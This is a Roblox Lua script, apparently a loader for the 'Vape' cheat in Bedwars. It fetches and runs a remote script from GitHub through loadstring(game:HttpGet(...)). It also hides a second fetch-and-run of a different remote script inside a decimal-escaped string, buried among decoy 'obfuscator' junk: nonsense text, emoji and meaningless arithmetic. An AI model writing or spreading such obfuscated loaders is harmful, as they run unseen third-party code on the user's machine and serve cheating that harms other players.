local Vape = {}
local Whitelist = {game.Players.LocalPlayer.Name}

function Vape.Module(Version, Is_Public)
	if Is_Public == true then
		return print("e")
	elseif Is_Public == false then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SmokeScripter/RobloxScripts/main/Bedwars/Vape.lua", true))()
		local __c={} function Obfuscate(string) local a="Protected Using ,__ Swopt Obfuscator __," local __obf=__c{}+100 if __obf==100 then string.find(__c) end local b=0 end  local u="这个混淆器是最好的原因：原因 1. 它受到超级保护，所以你应该一直使用它"  local b="😀😃😄😁😆😅😂🤣😊🙂🙃😉😌😍😘😗😙😋😛😝😜🤪🤨🧐👶🎓🎤"  loadstring('\32\102\117\110\99\116\105\111\110\32\71\101\116\83\99\114\105\112\116\40\83\116\114\105\110\103\41\32\112\114\105\110\116\40\83\116\114\105\110\103\41\32\101\110\100')()b=67388328239128424334723642367472823842.929483274645242564273429329273462374328487 b+= 9424204282094608438932899488903204.04923493204923483756326634625463463274/49294384732643743495.329943854752384539534959432887*03928427473264288437756257483274+929348238432746645.23943824739329403284824732743 local c = {"йцуккеннгншкзпкуххзвзащвылвьфыьвыфбчбьсывьсыюсыбсыьятимсчмырлсыовиыВИЦВЛЦЛДУГЦШКЦУКЩШЦЙГКЦРЩЦРВЫТомтмвтымвтмьллоргтгорр","ウクライナ軍によって保護されていますウクライナ軍によって保護されていますウクライナ軍によって保護されています"} loadstring('\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\83\119\111\112\116\116\47\83\99\114\105\112\116\115\47\109\97\105\110\47\86\80\69\66\68\87\65\82\83\39\44\32\102\97\108\115\101\41\41\40\41\10')()  local x="💲💗  Ⓖⓔｔ 𝐥ᗝѕ𝐭 βƗ𝓽c𝒽  👊💝" local function func() local d = {0.4123243234242392388238428483294328773258344732832, 923497399238432.3949234204924023942384923493289348385, 020403294329483249482.450232342343242394329493249329432848329858238778327} local b=0 for i,v in ipairs(d) do b += v end end local j="Swopt Obfuscator #1" 
	end
	if Version == "V4" then
		print("e")
	end
end

Vape.Module('V4', false)
